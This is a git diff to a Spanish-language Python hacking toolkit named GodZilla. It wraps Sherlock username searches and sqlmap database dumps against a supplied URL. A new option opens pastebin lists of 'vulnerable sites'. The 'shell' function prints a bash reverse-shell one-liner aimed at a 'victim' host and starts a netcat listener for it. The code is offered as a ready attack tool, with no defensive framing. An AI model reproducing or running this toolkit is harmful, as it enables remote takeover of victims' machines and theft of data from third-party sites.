@@ -20,122 +20,146 @@ WHITE = '\033[37m'
 RESET = '\033[39m'
 
 # hacemos las funciones principales
+
+def error():
+    print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
+    print(Fore.RESET + Back.RESET)
+    sys.exit()
+
+def list_sites():
+    try:
+        os.system('clear')
+        title = '''
+   ▄████████  ▄█      ███        ▄████████    ▄████████ 
+  ███    ███ ███  ▀█████████▄   ███    ███   ███    ███ 
+  ███    █▀  ███▌    ▀███▀▀██   ███    █▀    ███    █▀  
+  ███        ███▌     ███   ▀  ▄███▄▄▄       ███        
+▀███████████ ███▌     ███     ▀▀███▀▀▀     ▀███████████ 
+         ███ ███      ███       ███    █▄           ███ 
+   ▄█    ███ ███      ███       ███    ███    ▄█    ███ 
+ ▄████████▀  █▀      ▄████▀     ██████████  ▄████████▀  
+'''
+        print(Fore.RED + Back.RESET + title)
+        print('========================================================================================')
+        webbrowser.open('https://pastebin.com/gA2ZhLUr') 
+        webbrowser.open('https://pastebin.com/5MgPL3NX')
+        webbrowser.open('https://pastebin.com/nakQ3T5W')
+        print('========================================================================================')
+        print('[?] Proceso finalizado con éxito.')
+        print(Fore.RESET + Back.RESET)
+        sys.exit()
+
+    except:
+        error()
+
 def sherlock():
     try:
         os.system('clear')
         title = '''
-    \033[31m   ▄████████    ▄█    █▄       ▄████████    ▄████████  ▄█        ▄██████▄   ▄████████    ▄█   ▄█▄ 
-    \033[31m  ███    ███   ███    ███     ███    ███   ███    ███ ███       ███    ███ ███    ███   ███ ▄███▀ 
-    \033[31m  ███    █▀    ███    ███     ███    █▀    ███    ███ ███       ███    ███ ███    █▀    ███▐██▀   
-    \033[31m  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███       ███    ███ ███         ▄█████▀    
-    \033[31m▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███       ███    ███ ███        ▀▀█████▄    
-    \033[31m         ███   ███    ███     ███    █▄  ▀███████████ ███       ███    ███ ███    █▄    ███▐██▄   
-    \033[31m   ▄█    ███   ███    ███     ███    ███   ███    ███ ███▌    ▄ ███    ███ ███    ███   ███ ▀███▄ 
-    \033[31m ▄████████▀    ███    █▀      ██████████   ███    ███ █████▄▄██  ▀██████▀  ████████▀    ███   ▀█▀ 
-    \033[31m                                           ███    ███ ▀                                 ▀         
+   ▄████████    ▄█    █▄       ▄████████    ▄████████  ▄█        ▄██████▄   ▄████████    ▄█   ▄█▄ 
+  ███    ███   ███    ███     ███    ███   ███    ███ ███       ███    ███ ███    ███   ███ ▄███▀ 
+  ███    █▀    ███    ███     ███    █▀    ███    ███ ███       ███    ███ ███    █▀    ███▐██▀   
+  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███       ███    ███ ███         ▄█████▀    
+▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███       ███    ███ ███        ▀▀█████▄    
+         ███   ███    ███     ███    █▄  ▀███████████ ███       ███    ███ ███    █▄    ███▐██▄   
+   ▄█    ███   ███    ███     ███    ███   ███    ███ ███▌    ▄ ███    ███ ███    ███   ███ ▀███▄ 
+ ▄████████▀    ███    █▀      ██████████   ███    ███ █████▄▄██  ▀██████▀  ████████▀    ███   ▀█▀ 
+                                           ███    ███ ▀                                 ▀         
     '''
-        print(title)
+        print(Fore.RED + Back.RESET + title)
 
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        os.system(Fore.YELLOW + Back.RESET + f'cd sherlock && cd sherlock && python3 sherlock.py {para2[2]}')
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
+        print('========================================================================================')
+        os.system(f'cd sherlock && cd sherlock && python3 sherlock.py {para2[2]}')
+        print('========================================================================================')
+        print('[?] Proceso finalizado con éxito.')
         print(Fore.RESET + Back.RESET)
         sys.exit()
     
     except:
-        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
-        print(Fore.RESET + Back.RESET)
-        sys.exit()
+        error()
 
 
 def install():
     try:
         os.system('clear')
         title = '''
-    \033[31m ▄█  ███▄▄▄▄      ▄████████     ███        ▄████████\033[34m  ▄█        ▄█          ▄████████    ▄████████ 
-    \033[31m███  ███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███\033[34m ███       ███         ███    ███   ███    ███ 
-    \033[31m███▌ ███   ███   ███    █▀     ▀███▀▀██   ███    ███\033[34m ███       ███         ███    █▀    ███    ███ 
-    \033[31m███▌ ███   ███   ███            ███   ▀   ███    ███\033[34m ███       ███        ▄███▄▄▄      ▄███▄▄▄▄██▀ 
-    \033[31m███▌ ███   ███ ▀███████████     ███     ▀███████████\033[34m ███       ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
-    \033[31m███  ███   ███          ███     ███       ███    ███\033[34m ███       ███         ███    █▄  ▀███████████ 
-    \033[31m███  ███   ███    ▄█    ███     ███       ███    ███\033[34m ███▌    ▄ ███▌    ▄   ███    ███   ███    ███ 
-    \033[31m█▀    ▀█   █▀   ▄████████▀     ▄████▀     ███    █▀ \033[34m █████▄▄██ █████▄▄██   ██████████   ███    ███ 
-    \033[31m                                                    \033[34m ▀         ▀                        ███    ███ 
+ ▄█  ███▄▄▄▄      ▄████████     ███        ▄████████  ▄█        ▄█          ▄████████    ▄████████ 
+███  ███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███ ███       ███         ███    ███   ███    ███ 
+███▌ ███   ███   ███    █▀     ▀███▀▀██   ███    ███ ███       ███         ███    █▀    ███    ███ 
+███▌ ███   ███   ███            ███   ▀   ███    ███ ███       ███        ▄███▄▄▄      ▄███▄▄▄▄██▀ 
+███▌ ███   ███ ▀███████████     ███     ▀███████████ ███       ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
+███  ███   ███          ███     ███       ███    ███ ███       ███         ███    █▄  ▀███████████ 
+███  ███   ███    ▄█    ███     ███       ███    ███ ███▌    ▄ ███▌    ▄   ███    ███   ███    ███ 
+█▀    ▀█   █▀   ▄████████▀     ▄████▀     ███    █▀  █████▄▄██ █████▄▄██   ██████████   ███    ███ 
+                                                     ▀         ▀                        ███    ███ 
     '''
-        print(title)
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        os.system(Fore.YELLOW + Back.RESET + f'sudo su && sudo apt-get update && apt-get install git -y && sudo apt-get install python3 && pip3 install colorama && pip3 install webbrowser && sudo apt-get install python3-pip && git clone https://github.com/sherlock-project/sherlock')
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
+        print(Fore.RED + Back.RESET + title)
+        print('========================================================================================')
+        os.system(f'sudo su && sudo apt-get update && apt-get install git -y && sudo apt-get install python3 && pip3 install colorama && pip3 install webbrowser && sudo apt-get install python3-pip && git clone https://github.com/sherlock-project/sherlock')
+        print('========================================================================================')
+        print('[?] Proceso finalizado con éxito.')
         print(Fore.RESET + Back.RESET)
         sys.exit()
 
     except:
-        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
-        print(Fore.RESET + Back.RESET)
-        sys.exit()
+        error()
 
 def credits():
     try:
         os.system('clear')
         title = '''
-    \033[31m ▄████████    ▄████████    ▄████████\033[34m ████████▄   ▄█      ███        ▄████████ 
-    \033[31m███    ███   ███    ███   ███    ███\033[34m ███   ▀███ ███  ▀█████████▄   ███    ███ 
-    \033[31m███    █▀    ███    ███   ███    █▀ \033[34m ███    ███ ███▌    ▀███▀▀██   ███    █▀  
-    \033[31m███         ▄███▄▄▄▄██▀  ▄███▄▄▄    \033[34m ███    ███ ███▌     ███   ▀   ███        
-    \033[31m███        ▀▀███▀▀▀▀▀   ▀▀███▀▀▀    \033[34m ███    ███ ███▌     ███     ▀███████████ 
-    \033[31m███    █▄  ▀███████████   ███    █▄ \033[34m ███    ███ ███      ███              ███ 
-    \033[31m███    ███   ███    ███   ███    ███\033[34m ███   ▄███ ███      ███        ▄█    ███ 
-    \033[31m████████▀    ███    ███   ██████████\033[34m ████████▀  █▀      ▄████▀    ▄████████▀  
-    \033[31m             ███    ███             \033[34m                                          
+ ▄████████    ▄████████    ▄████████ ████████▄   ▄█      ███        ▄████████ 
+███    ███   ███    ███   ███    ███ ███   ▀███ ███  ▀█████████▄   ███    ███ 
+███    █▀    ███    ███   ███    █▀  ███    ███ ███▌    ▀███▀▀██   ███    █▀  
+███         ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███ ███▌     ███   ▀   ███        
+███        ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███ ███▌     ███     ▀███████████ 
+███    █▄  ▀███████████   ███    █▄  ███    ███ ███      ███              ███ 
+███    ███   ███    ███   ███    ███ ███   ▄███ ███      ███        ▄█    ███ 
+████████▀    ███    ███   ██████████ ████████▀  █▀      ▄████▀    ▄████████▀  
+             ███    ███                                                                                              
     '''
-        print(title)
-        print(Fore.RED + Back.RESET + '========================================================================================')
+        print(Fore.RED + Back.RESET + title)
+        print('========================================================================================')
         options = '''
     [?] Este proyecto ha sido creado por ZombieGeek0.
     [?] GitHub: https://www.github.com/ZombieGeek0.
     [?] GitHub del proyecto: https://github.com/ZombieGeek0/GodZilla.
     [?] Version 1.0.
     '''
-        print(Fore.YELLOW + Back.RESET + options)
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
+        print(options)
+        print('========================================================================================')
+        print('[?] Proceso finalizado con éxito.')
         print(Fore.RESET + Back.RESET)
         sys.exit()
     
     except:
-        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
-        print(Fore.RESET + Back.RESET)
-        sys.exit()
+        error()
 
 def shell():
     try:
         os.system('clear')
         title = '''
-    \033[31m   ▄████████    ▄█    █▄   \033[34m    ▄████████  ▄█        ▄█       
-    \033[31m  ███    ███   ███    ███  \033[34m   ███    ███ ███       ███       
-    \033[31m  ███    █▀    ███    ███  \033[34m   ███    █▀  ███       ███       
-    \033[31m  ███         ▄███▄▄▄▄███▄▄\033[34m  ▄███▄▄▄     ███       ███       
-    \033[31m▀███████████ ▀▀███▀▀▀▀███▀ \033[34m ▀▀███▀▀▀     ███       ███       
-    \033[31m         ███   ███    ███  \033[34m   ███    █▄  ███       ███       
-    \033[31m   ▄█    ███   ███    ███  \033[34m   ███    ███ ███▌    ▄ ███▌    ▄ 
-    \033[31m ▄████████▀    ███    █▀   \033[34m   ██████████ █████▄▄██ █████▄▄██ 
-    \033[31m                           \033[34m              ▀         ▀         
+   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█       
+  ███    ███   ███    ███     ███    ███ ███       ███       
+  ███    █▀    ███    ███     ███    █▀  ███       ███       
+  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███       
+▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███       
+         ███   ███    ███     ███    █▄  ███       ███       
+   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄ 
+ ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██ 
+                                         ▀         ▀         
     '''
-        print(title)
-        print(Fore.RED + Back.RESET + '[?] Comando a ejecutar en la víctima: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        os.system(Fore.YELLOW + Back.RESET + f'nc -lvp {para3[3]}')
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
+        print(Fore.RED + Back.RESET + title)
+        print('[?] Comando a ejecutar en la víctima: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
+        print('========================================================================================')
+        os.system(f'nc -lvp {para3[3]}')
+        print('========================================================================================')
+        print('[?] Proceso finalizado con éxito.')
         print(Fore.RESET + Back.RESET)
         sys.exit()
 
     except:
-        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
-        print(Fore.RESET + Back.RESET)
-        sys.exit()
+        error()
 
 def helper():
     try:
@@ -152,8 +176,8 @@ def helper():
 \033[31m  ███    █▀      ██████████ █████▄▄██\033[34m  ▄████▀        ██████████   ███    ███ 
 \033[31m                            ▀        \033[34m                             ███    ███ 
 '''
-        print(title)
-        print(Fore.RED + Back.RESET + '========================================================================================')
+        print(Fore.RED + Back.RESET + title)
+        print('========================================================================================')
         options = '''
 python3 godzilla.py -i   --> [Install the tools] 
 
@@ -164,17 +188,47 @@ python3 godzilla.py -c   --> [The credits]
 python3 godzilla.py -a -p [port]   --> [Attack with bash reverse shell]
 
 python3 godzilla.py -h   --> [Help]
+
+python3 godzilla.py -m -u [url]  --> [Scan with SqlMap]
+
+python3 godzilla.py -l   --> [Open a vulnerable sites list]
 '''
-        print(Fore.YELLOW + Back.RESET + options)
-        print(Fore.RED + Back.RESET + '========================================================================================')
-        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
+
+        print(options)
+        print('========================================================================================')
+        print('[?] Proceso finalizado con éxito.')
         print(Fore.RESET + Back.RESET)
         sys.exit()
 
     except:
-        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
+        error()
+
+def sqlmap():
+    try:
+        os.system('clear')
+        title = '''
+   ▄████████ ████████▄    ▄█         ▄▄▄▄███▄▄▄▄      ▄████████    ▄███████▄ 
+  ███    ███ ███    ███  ███       ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███ 
+  ███    █▀  ███    ███  ███       ███   ███   ███   ███    ███   ███    ███ 
+  ███        ███    ███  ███       ███   ███   ███   ███    ███   ███    ███ 
+▀███████████ ███    ███  ███       ███   ███   ███ ▀███████████ ▀█████████▀  
+         ███ ███    ███  ███       ███   ███   ███   ███    ███   ███        
+   ▄█    ███ ███  ▀ ███  ███▌    ▄ ███   ███   ███   ███    ███   ███        
+ ▄████████▀   ▀██████▀▄█ █████▄▄██  ▀█   ███   █▀    ███    █▀   ▄████▀      
+                         ▀                                                  
+    '''
+        print(Fore.RED + Back.RESET + title)
+
+        print('========================================================================================')
+        os.system(f'cd sqlmap &&python3 sqlmap.py -u {para2[2]} -dbs') 
+        print('========================================================================================')
+        print('[?] Proceso finalizado con éxito.')
         print(Fore.RESET + Back.RESET)
         sys.exit()
+
+    except:
+        error()
+
 
 # hacemos el menú
 def menu():
@@ -192,6 +246,12 @@ def menu():
 
     elif para1[1] == '-h':
         helper()
+
+    elif para1[1] == '-m':
+        sqlmap()
+
+    elif para1[1] == 'l':
+        list_sites()
 
     else:
         print(Fore.RED + Back.RESET + '\n[?] Error: Revisa si has incluido todos los parámetros necesarios en la petición.')
